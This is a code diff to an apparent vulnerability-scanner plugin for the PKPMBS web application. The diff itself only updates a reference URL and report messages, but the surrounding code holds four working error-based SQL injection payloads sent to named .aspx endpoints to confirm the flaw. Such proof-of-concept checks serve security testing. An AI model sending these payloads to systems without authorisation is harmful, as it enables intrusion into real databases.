@@ -20,7 +20,7 @@ class Vuln(ABVuln):
         /INFOBLXX.aspx
         /userService/addresslist.aspx
     '''  # 漏洞描述
-    ref = 'Unknown'  # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=0121058
+    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0121058'  # 漏洞来源
     cnvd_id = 'Unknown'  # cnvd漏洞编号
     cve_id = 'Unknown'  # cve编号
     product = 'PKPMBS'  # 漏洞应用名称
@@ -58,29 +58,29 @@ class Poc(ABPoc):
             post = "__keyword__=1%27%20and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version ))%20and%20%27%%27=%27"
             code, head, res, errcode, _ = hh.http(url, post)
             if code == 500 and "GAO JI@Microsoft SQL" in res:
-                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                    target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
+                    target=self.target, name=self.vuln.name, url=url))
 
             url = arg+"/pkpmbs/manager/userfolderlist.aspx"
             post = "username=1%27%20and%201=convert%28int%2C%28char%2871%29%2Bchar%2865%29%2Bchar%2879%29%2Bchar%2874%29%2Bchar%2873%29%2B@@version%29%29%20and%20%27%%27=%27&cxbtn=%E6%9F%A5%E6%89%BE"
             code, head, res, errcode, _ = hh.http(url, post)
             if code == 500 and "GAOJIMicrosoft" in res:
-                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                    target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
+                    target=self.target, name=self.vuln.name, url=url))
 
             url = arg+"/INFOBLXX.aspx"
             post = "key=1%27%20and%201=convert%28int%2C%28char%2871%29%2Bchar%2865%29%2Bchar%2879%29%2Bchar%2874%29%2Bchar%2873%29%2B@@version%29%29%20and%20%27%%27=%27&qtype=bljlwh"
             code, head, res, errcode, _ = hh.http(url, post)
             if code == 500 and "GAOJIMicrosoft" in res:
-                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                    target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
+                    target=self.target, name=self.vuln.name, url=url))
 
             url = arg+"/userService/addresslist.aspx"
             post = "keytype=username&keyword=1%27%20and%201=convert%28int%2C%28char%2871%29%2Bchar%2865%29%2Bchar%2879%29%2Bchar%2874%29%2Bchar%2873%29%2B@@version%20%29%29%20and%20%27%%27=%27&Submit=%B2%E9++%D5%D2"
             code, head, res, errcode, _ = hh.http(url, post)
             if code == 500 and "GAOJIMicrosoft" in res:
-                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                    target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
+                    target=self.target, name=self.vuln.name, url=url))
 
         except Exception as e:
             self.output.info('执行异常{}'.format(e))
